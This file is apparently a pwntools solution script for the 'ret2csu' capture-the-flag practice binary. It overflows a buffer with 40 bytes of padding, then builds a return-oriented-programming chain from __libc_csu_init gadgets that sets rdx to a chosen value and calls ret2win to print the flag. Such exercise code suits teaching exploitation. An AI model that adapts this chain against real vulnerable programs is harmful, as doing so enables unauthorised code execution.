from pwn import *

gadget_one = 0x40089a
gadget_two = 0x400880
ret2win = 0x4007b1
rdx = 0xdeadcafebabebeef
init = 0x600e38

p = process('./ret2csu')

exploit = ''
exploit += 'A'*40
exploit += p64(gadget_one)
exploit += p64(0x0)
exploit += p64(0x1)
exploit += p64(init)
exploit += p64(0x1)
exploit += p64(0x1)
exploit += p64(0xdeadcafebabebeef)
exploit += p64(gadget_two)
exploit += 'A'*7*8
exploit += p64(ret2win)

p.recvuntil('>')
p.sendline(exploit)
print p.recvuntil('}')